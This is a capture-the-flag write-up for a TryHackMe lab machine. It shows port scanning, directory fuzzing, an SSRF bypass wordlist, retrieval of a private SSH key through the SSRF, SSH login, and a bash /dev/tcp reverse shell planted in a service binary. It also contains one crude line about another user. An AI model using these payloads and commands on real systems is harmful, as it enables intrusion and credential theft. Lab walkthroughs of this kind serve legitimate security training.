---
title: "TryHackMe: Rabbit Store"
author: cilgin
date: 2025-07-08 13:57:28 +0300
categories: [CyberSecurity]
tags: [CTF, TryHackMe, Medium]
pin: false
math: false
mermaid: false
image:
  path: /assets/img/2025-07-09-TryHackMe-The_London_Bridge/main.webp
---

Hi I'm making <https://tryhackme.com/room/thelondonbridge> room.

---

```bash
export IP=10.10.22.48
```

```bash
❯ nmap -T4 -n -sC -sV -Pn -p- $IP
Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-09 13:55 +0300
Nmap scan report for 10.10.22.48
Host is up (0.070s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 58:c1:e4:79:ca:70:bc:3b:8d:b8:22:17:2f:62:1a:34 (RSA)
|   256 2a:b4:1f:2c:72:35:7a:c3:7a:5c:7d:47:d6:d0:73:c8 (ECDSA)
|_  256 1c:7e:d2:c9:dd:c2:e4:ac:11:7e:45:6a:2f:44:af:0f (ED25519)
8080/tcp open  http    Gunicorn
|_http-server-header: gunicorn
|_http-title: Explore London
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.48 seconds
```

Lets go to the $IP:8000 in browser.

![Desktop View](/assets/img/2025-07-09-TryHackMe-The_London_Bridge/photo1.webp){: width="972" height="589" }

Good now lets use `gobuster` to fuzz the directories.

```bash
❯ gobuster dir -w common.txt -u http://$IP:8080/ -x md,js,html,php,py,css,txt,bak -t 50
===============================================================
Gobuster v3.7
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.22.48:8080/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.7
[+] Extensions:              css,txt,bak,md,js,html,php,py
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/contact              (Status: 200) [Size: 1703]
/feedback             (Status: 405) [Size: 178]
/gallery              (Status: 200) [Size: 1722]
/upload               (Status: 405) [Size: 178]
Progress: 42651 / 42651 (100.00%)
===============================================================
Finished
===============================================================
```

Lets go to the /gallery first.

![Desktop View](/assets/img/2025-07-09-TryHackMe-The_London_Bridge/photo2.webp){: width="972" height="589" }

we can see that that upload endpoint is used here. I upload some image and get the post request body.

![Desktop View](/assets/img/2025-07-09-TryHackMe-The_London_Bridge/photo3.webp){: width="972" height="589" }


Also we can only upload images I tried a lot of techniqes such as : ... but none of them worked.


Also injecting python reverse shell into the image doesn't worked.

Also when I'm looking at the source code i saw this line.


```html
    </div>
    <h5>Visited London recently? Contribute to the gallery</h5>
    <form method="POST" action="/upload" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit" value="Upload">
    </form>
    <!-To devs: Make sure that people can also add images using links->
```

Maybe there could be other endpoint we missed lets try other wordlist with `gobuster`



```bash
❯ gobuster dir -w big.txt -u http://$IP:8080/ -x md,js,html,php,py,css,txt,bak -t 50
===============================================================
Gobuster v3.7
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.22.48:8080/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.7
[+] Extensions:              css,txt,bak,md,js,html,php,py
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/contact              (Status: 200) [Size: 1703]
/feedback             (Status: 405) [Size: 178]
/gallery              (Status: 200) [Size: 1904]
/upload               (Status: 405) [Size: 178]
/view_image           (Status: 405) [Size: 178]
Progress: 184221 / 184221 (100.00%)
===============================================================
Finished
===============================================================
```

And yes we missed /view_image lets use that endpoint.



```bash
❯ curl $IP:8080/view_image     
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
```


This endpoint wants POST request rather than GET request.


```bash
❯ curl -X POST $IP:8080/view_image
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Image</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: bisque;
        }
        img {
            max-width: 100%;
            height: auto;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
    </style>
</head>
<body>
    <h1>View Image</h1>
    <form action="/view_image" method="post">
        <label for="image_url">Enter Image URL:</label><br>
        <input type="text" id="image_url" name="image_url" required><br><br>
        <input type="submit" value="View Image">
    </form>
    

</body>
</html>
```



```bash
❯ curl -X POST http://$IP:8080/view_image \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "image_url=https://upload.wikimedia.org/wikipedia/commons/thumb/7/70/Example.png/640px-Example.png"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Image</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: bisque;
        }
        img {
            max-width: 100%;
            height: auto;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
    </style>
</head>
<body>
    <h1>View Image</h1>
    <form action="/view_image" method="post">
        <label for="image_url">Enter Image URL:</label><br>
        <input type="text" id="image_url" name="image_url" required><br><br>
        <input type="submit" value="View Image">
    </form>
    
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/70/Example.png/640px-Example.png" alt="User provided image">


</body>
</html>
```

I tried lot of things here but none of them worked again.

Maybe we need to fuzz the /uploads directory there could be some secret files in there.

```bash
❯ ffuf -w common.txt -X POST -u 'http://10.10.22.48:8080/view_image' -H 'Content-Type: application/x-www-form-urlencoded' -d 'FUZZ=/uploads/04.jpg' -fw 226

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.22.48:8080/view_image
 :: Wordlist         : FUZZ: /home/cilgin/dev/wordlist/common.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : FUZZ=/uploads/04.jpg
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 226
________________________________________________

www                     [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 83ms]
:: Progress: [4739/4739] :: Job [1/1] :: 555 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
```

And I found www in there.


Lets try www.

Lets firstly spin up a quick webserver.

```bash
❯ sudo python -m http.server 80
```

Then lets try to connect it.

```bash
❯ curl -X POST http://$IP:8080/view_image \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "www=http://10.21.206.128"
<!DOCTYPE HTML>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Directory listing for /</title>
</head>
<body>
<h1>Directory listing for /</h1>
<hr>
<ul>
<li><a href="common.txt">common.txt</a></li>
</ul>
<hr>
</body>
</html>
```
And its working.

Now lets try connecting to localhost.

```bash
❯ curl -X POST http://$IP:8080/view_image \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "www=http://127.0.0.1:"   
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>403 Forbidden</title>
<h1>Forbidden</h1>
<p>You don&#x27;t have the permission to access the requested resource. It is either read-protected or not readable by the server.</p>
```

It seems we don't have permission or we have?

We can use a ssrf vuln to get localhost.

for more details check this out: 

<https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md>


Also I'm gonna use this wordlist for testing this vuln.

```text
127.0.0.1:80
127.0.0.1:443
127.0.0.1:22
127.1:80
0
0.0.0.0:80
localhost:80
[::]:80/
[::]:25/ SMTP
[::]:3128/ Squid
[0000::1]:80/
[0:0:0:0:0:ffff:127.0.0.1]/thefile
①②⑦.⓪.⓪.⓪
127.127.127.127
127.0.1.3
127.0.0.0
2130706433/
017700000001
3232235521/
3232235777/
0x7f000001/
0xc0a80014/
{domain}@127.0.0.1
127.0.0.1#{domain}
{domain}.127.0.0.1
127.0.0.1/{domain}
127.0.0.1/?d={domain}
{domain}@127.0.0.1
127.0.0.1#{domain}
{domain}.127.0.0.1
127.0.0.1/{domain}
127.0.0.1/?d={domain}
{domain}@localhost
localhost#{domain}
{domain}.localhost
localhost/{domain}
localhost/?d={domain}
127.0.0.1%00{domain}
127.0.0.1?{domain}
127.0.0.1///{domain}
127.0.0.1%00{domain}
127.0.0.1?{domain}
127.0.0.1///{domain}st:+11211aaa
st:00011211aaaa
0/
127.1
127.0.1
1.1.1.1 &@2.2.2.2# @3.3.3.3/
127.1.1.1:80\@127.2.2.2:80/
127.1.1.1:80\@@127.2.2.2:80/
127.1.1.1:80:\@@127.2.2.2:80/
127.1.1.1:80#\@127.2.2.2:80/
```


```bash
❯ ffuf -u http://$IP:8080/view_image -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "www=http://FUZZ" \
     -w ssrf.txt -fw 27

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.22.48:8080/view_image
 :: Wordlist         : FUZZ: /home/cilgin/dev/wordlist/ssrf.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : www=http://FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 27
________________________________________________

[::]:80/                [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 105ms]
[::]:25/ SMTP           [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 116ms]
[::]:3128/ Squid        [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 116ms]
2130706433/             [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 117ms]
127.0.0.0               [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 130ms]
0                       [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 137ms]
①②⑦.⓪.⓪.⓪               [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 145ms]
127.1                   [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 77ms]
017700000001            [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 91ms]
[0000::1]:80/           [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 95ms]
0x7f000001/             [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 98ms]
st:00011211aaaa         [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 71ms]
0/                      [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 74ms]
127.0.1                 [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 74ms]
127.1.1.1:80\@127.2.2.2:80/ [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 74ms]
127.1.1.1:80\@@127.2.2.2:80/ [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 74ms]
127.1.1.1:80#\@127.2.2.2:80/ [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 76ms]
:: Progress: [52/52] :: Job [1/1] :: 2 req/sec :: Duration: [0:00:20] :: Errors: 11 ::
```


```bash
❯ curl -X POST http://$IP:8080/view_image \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "www=http://127.1"    
<HTML>
<body bgcolor="gray">
<h1>London brigde</h1>
<img height=400px width=600px src ="static/1.webp"><br>
<font type="monotype corsiva" size=18>London Bridge is falling down<br>
    Falling down, falling down<br>
    London Bridge is falling down<br>
    My fair lady<br>
    Build it up with iron bars<br>
    Iron bars, iron bars<br>
    Build it up with iron bars<br>
    My fair lady<br>
    Iron bars will bend and break<br>
    Bend and break, bend and break<br>
    Iron bars will bend and break<br>
    My fair lady<br>
<img height=400px width=600px src="static/2.webp"><br>
<font type="monotype corsiva" size=18>Build it up with gold and silver<br>
    Gold and silver, gold and silver<br>
    Build it up with gold and silver<br>
    My fair lady<br>
    Gold and silver we've not got<br>
    We've not got, we've not got<br>
    Gold and silver we've not got<br>
    My fair lady<br>
<img height=400px width=600px src="static/3.jpg"><br>
    London Bridge is falling down<br>
    Falling down, falling down<br>
    London Bridge is falling down<br>
    My fair lady<br>
    London Bridge is falling down<br>
    Falling down, falling down<br>
    London Bridge is falling down<br>
    My fair beth</font>
</body>
</HTML>
```


```bash
❯ curl -X POST http://$IP:8080/view_image \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "www=http://127.1:8080"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Explore London</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f2f2f2;
        }
        header {
            background-color: #333;
            color: #fff;
            padding: 10px 20px;
            text-align: center;
        }
        nav {
            background-color: #444;
            color: #fff;
            padding: 10px 20px;
            text-align: center;
        }
        nav a {
            color: #fff;
            text-decoration: none;
            margin: 0 10px;
        }
        .container {
            max-width: 1200px;
            margin: 20px auto;
            padding: 0 20px;
        }
        h1 {
            color: #f9f5f5;
            text-align: center;
            margin-bottom: 30px;
        }
        .main-content {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        footer {
            background-color: #333;
            color: #fff;
            text-align: center;
            position: fixed;
            bottom: 0;
            width: 100%;
        }
    </style>
</head>
<body>
    <header>
        <h1>Welcome to Explore London</h1>
    </header>
    <nav>
        <a href="/">Home</a>
        <a href="#">Attractions</a>
        <a href="#">Events</a>
        <a href="/gallery">Gallery</a>
        <a href="/contact">Contact</a>
    </nav>
    <div class="container">
        <div class="main-content">
            <h2>About London</h2>
            <p>London, the capital of England and the United Kingdom, is a 21st-century city with history stretching back to Roman times. At its centre stand the imposing Houses of Parliament, the iconic ‘Big Ben’ clock tower and Westminster Abbey, site of British monarch coronations. Across the Thames River, the London Eye observation wheel provides panoramic views of the South Bank cultural complex, and the entire city.</p>
            <h2>Explore Attractions</h2>
            <p>London offers a wide range of attractions including the British Museum, the Tower of London, Buckingham Palace, the London Eye, and many more.</p>
            <h2>Upcoming Events</h2>
            <p>London hosts various events throughout the year including festivals, concerts, exhibitions, and sporting events.</p>
        </div>
    </div>
    <footer>
        <p>&copy; 2024 Explore London</p>
    </footer>
</body>
</html>
```


`127.1` seems to be working.


Now lets fuzz port website on port 80.



```bash
❯ ffuf -u http://$IP:8080/view_image -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "www=http://127.1:80/FUZZ" -w common.txt -fw 96

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.22.48:8080/view_image
 :: Wordlist         : FUZZ: /home/cilgin/dev/wordlist/common.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : www=http://127.1:80/FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 96
________________________________________________

.bash_history           [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 75ms]
.bashrc                 [Status: 200, Size: 3771, Words: 522, Lines: 118, Duration: 144ms]
.cache                  [Status: 200, Size: 474, Words: 19, Lines: 18, Duration: 176ms]
.env                    [Status: 200, Size: 533, Words: 22, Lines: 21, Duration: 171ms]
.profile                [Status: 200, Size: 807, Words: 128, Lines: 28, Duration: 112ms]
.ssh                    [Status: 200, Size: 399, Words: 18, Lines: 17, Duration: 106ms]
index.html              [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 81ms]
static                  [Status: 200, Size: 420, Words: 19, Lines: 18, Duration: 133ms]
templates               [Status: 200, Size: 1294, Words: 358, Lines: 44, Duration: 93ms]
uploads                 [Status: 200, Size: 734, Words: 25, Lines: 24, Duration: 106ms]
:: Progress: [4739/4739] :: Job [1/1] :: 415 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
```



it looks like a home directory for a *nix user.

Lets try getting ssh key:


```bash
❯ curl -X POST http://$IP:8080/view_image \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "www=http://127.1/.ssh"  
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Directory listing for /.ssh/</title>
</head>
<body>
<h1>Directory listing for /.ssh/</h1>
<hr>
<ul>
<li><a href="authorized_keys">authorized_keys</a></li>
<li><a href="id_rsa">id_rsa</a></li>
</ul>
<hr>
</body>
</html>

dev/wordlist/scripts via  
❯ curl -X POST http://$IP:8080/view_image \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "www=http://127.1/.ssh/id_rsa"
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAz1yFrg9FAZAI4R37aQWn/ePTk/MKfz2KQ+OE45KErguL34Yj
5Kc1VJjDTTNRmc+vNRZieC8EwelWgpwcKACa70Ke2q/7zRLWHh23OUxWiSAAORTe
...
7MDu4QKBgFIomwhD+jmr3Vc2HutYkl3zliSD239sH3k118sTHbedvKH5Q7nw0C+U
a7RMp/cXWZKdyRgFxQ7DQEorzWi5bLAyxXnMg0ghwWdf4nugQmaEG7t+OYUNsf7M
fDLzMA915WcODR6L0mWO0crAMbZQOkg1KlAiwQSQmuUpPqyAfq6x
-----END RSA PRIVATE KEY-----
```


But we need to learn username for connecting to system.


```bash
❯ curl -X POST http://$IP:8080/view_image \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "www=http://127.1/../../../../../etc/passwd"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 404</p>
        <p>Message: File not found.</p>
        <p>Error code explanation: HTTPStatus.NOT_FOUND - Nothing matches the given URI.</p>
    </body>
</html>
```


Seems like there is not lfi.


```bash
❯ curl -X POST http://$IP:8080/view_image \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "www=http://127.1/.ssh/authorized_keys"
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPXIWuD0UBkAjhHftpBaf949OT8wp/PYpD44TjkoSuC4vfhiPkpzVUmMNNM1GZz681FmJ4LwTB6VaCnBwoAJrvQp7ar/vNEtYeHbc5TFaJIAA5FN5rWzl66zeCFNaNx841E4CQSDs7dew3CCn3dRQHzBtT4AOlmcUs9QMSsUqhKn53EbivHCqkCnqZqqwTh0hkd0Cr5i3r/Yc4REqsVaI41Cl3pkDxrfbmhZdjxRpES8pO5dyOUvnq3iJZDOxFBsG8H4RODaZrTW78eZbcz1LKug/KlwQ6q8+e4+mpcdm7sHAAszk0eFcI2a37QQ4Fgq96OwMDo15l8mDDrk1Ur7aF beth@london
```

name could be beth.


```bash
❯ ssh -i adam.ssh beth@$IP
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Mon May 13 22:38:30 2024 from 192.168.62.137
beth@london:~$ 
```

we are in


```bash
beth@london:/home$ ls -la
total 16
drwxr-xr-x  4 root    root    4096 Mar 10  2024 .
drwxr-xr-x 23 root    root    4096 Apr  7  2024 ..
drwxr-xr-x 11 beth    beth    4096 May  7  2024 beth
drw-------  3 charles charles 4096 Apr 23  2024 charles
```

wait for me charles I'm gonna fuck you too.

Firstly lets get the flag:

```bash
beth@london:~$ cat __pycache__/user.txt 
THM{****_****_***_******}
```

```bash
beth@london:/home$ find / -perm /4000 2>/dev/null
/bin/fusermount
/bin/su
/bin/ping
/bin/mount
/bin/umount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/vmware-user-suid-wrapper
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/sudo
/usr/bin/newgidmap
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/share/dbus-1/system-services
```
nothing crazy


Lets run linpeas.

```
/etc/systemd/system/multi-user.target.wants/app.service is calling this writable executable: /home/beth/
```

```bash
beth@london:/tmp$ cat /etc/systemd/system/multi-user.target.wants/app.service
[Unit]
Description=My service
After=multi-user.target

[Service]
Type=simple
Restart=always
WorkingDirectory=/home/beth
Environment="PATH=/home/beth"
ExecStart=/home/beth/.local/bin/gunicorn --config gunicorn_config.py app:app

[Install]
WantedBy=multi-user.target
```


So we can make gunicorn a reverse shell. And get the root.


```bash
beth@london:~$ cd .local/bin/
beth@london:~/.local/bin$ ls
flask  gunicorn  gunicorn_paster
beth@london:~/.local/bin$ mv gunicorn gunicorn.bak
beth@london:~/.local/bin$ ls
flask  gunicorn.bak  gunicorn_paster
beth@london:~/.local/bin$ ls -la
total 20
drwxrwxr-x 2 beth beth 4096 Jul  9 05:34 .
drwxrwxr-x 5 beth beth 4096 Mar 11  2024 ..
-rwxrwxr-x 1 beth beth  212 Mar 11  2024 flask
-rwxrwxr-x 1 beth beth  221 Mar 11  2024 gunicorn.bak
-rwxrwxr-x 1 beth beth  222 Mar 11  2024 gunicorn_paster
beth@london:~/.local/bin$ vim

Command 'vim' not found, but can be installed with:

apt install vim       
apt install vim-gtk3  
apt install vim-tiny  
apt install neovim    
apt install vim-athena
apt install vim-gtk   
apt install vim-nox   

Ask your administrator to install one of them.

beth@london:~/.local/bin$ echo "/bin/bash -i >& /dev/tcp/10.21.206.128/4444 0>&1" > gunicorn
beth@london:~/.local/bin$ chmod 777 gunicorn
```

I can't kill gunicorn app. I tried to kill it using different techniqes but they didn't worked. of course.


So I changed my mind and used CVE-2018-18955 which linpeas suggested me to use.


```bash
beth@london:~$ uname -a
Linux london 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```
This is because the kernel version is too old.
